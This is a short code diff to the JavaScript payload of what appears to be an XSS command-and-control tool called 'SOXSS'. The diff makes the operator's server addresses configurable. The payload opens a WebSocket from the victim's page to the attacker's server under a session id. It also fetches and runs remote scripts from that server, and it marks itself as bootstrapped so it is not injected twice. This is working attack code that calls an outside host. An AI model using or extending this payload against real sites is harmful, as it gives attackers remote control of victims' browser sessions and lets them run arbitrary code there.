@@ -1,4 +1,6 @@
 var webSocket = window.__SOXSS_SOCKET__ || null;
+var httpBase = "$hbase";
+var wsBase = "$wsbase";
 
 function sendMessage(msg) {
     if (!webSocket || webSocket.readyState !== 1) {
@@ -11,7 +13,7 @@ function sendMessage(msg) {
 function loadScriptFromURL(url) {
     // Si la URL no viene completa, se completa la URL para descargar el script del servidor
     if (!(/(http(s?)):\/\//i.test(url))) {
-        url = "http://$hhost:$hport/" + url
+        url = httpBase + url.replace(/^\/+/, '')
     }
     // Return a promise that resolves when the script has actually loaded and executed
     return new Promise((resolve, reject) => {
@@ -37,7 +39,7 @@ if (window.__SOXSS_BOOTSTRAPPED__) {
     console.info("SOXSS payload already active in this page context.");
 } else {
     window.__SOXSS_BOOTSTRAPPED__ = true;
-    webSocket = new WebSocket("ws://$whost:$wport/$sid");
+    webSocket = new WebSocket(wsBase + "/$sid");
     window.__SOXSS_SOCKET__ = webSocket;
 
     webSocket.onopen = (event) => {
